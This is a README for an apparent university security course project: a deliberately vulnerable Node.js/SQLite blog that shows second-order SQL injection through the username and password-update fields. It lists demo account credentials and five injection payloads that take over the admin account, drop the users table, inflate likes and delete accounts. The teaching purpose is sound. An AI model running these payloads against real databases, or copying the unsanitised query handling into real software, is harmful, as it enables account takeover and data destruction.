### TDA602 Course Project - Second-Order SQL Injection

This project demonstrates a second-order SQL injection vulnerability in a blog website.
The code is written in Node.js and SQLite, and this is a self-made blog created and designed by us. We intentionally added some lack of security measures to make the second-order SQL injection attacks possible, allowing us to demonstrate the vulnerability and emphasize the importance of proper security practices when developing web applications.

Users can create new accounts and write blog posts after logging in. Each post can be liked once, 
and the posts are sorted by the number of likes, with the most liked posts appearing at the top. 
As an admin, you have also the privilege to remove these posts.
The second-order injection attack can be performed by registering a new account with a malicious SQL 
command in the username field and then updating the password. Further details are provided below.

## Current Accounts:

Admin - Username: "Admin", Password: "dontHack"

Ava - Username: "Ava", Password: "password1"

JARVIS - Username: "JARVIS", Password: "password2"

Skynet - Username: "Skynet", Password: "password3"


## Second-Order Injection Attacks:

To perform a second-order SQL injection attack, first register a new user with an SQL injection command as the username. 
Then, log in as the new user and update the password. Afterward, the SQL command will be executed.

Examples of second-order SQL injection attacks:

1) Change the Admin's password (not the "Admin’ —" account):

```sql
Admin' --
```

2) Drop all users:

```sql
'; DROP TABLE users --
```

3) Add likes to a specific blog post (replace id with the blog post ID you want to modify, same with amount of likes):

```sql
'; UPDATE blog_posts SET number_likes = number_likes + 10 WHERE id = 1 --
```

4) Remove the new account
```sql
' ; DELETE FROM users WHERE ROWID = (SELECT MAX(ROWID) FROM users) --
```

5) Remove last account and any other you specify
```sql
' ; DELETE FROM users WHERE ROWID = (SELECT MAX(ROWID) FROM users) OR username = "'; UPDATE blog_posts SET number_likes = number_likes + 10 WHERE id = 1 --" --
```


## Images of the blog website:

#### Login and Register:

<img src="Screenshot 2023-04-17 at 12.33.24.png" alt="My Image" style="max-width: 70%;">

#### Logged in as admin (only difference is the delete button):


<img src="Screenshot 2023-04-17 at 12.34.25.png" alt="My Image" style="max-width: 70%;">

#### Create post and update password:

<img src="Screenshot 2023-04-17 at 12.34.34.png" alt="My Image" style="max-width: 70%;">

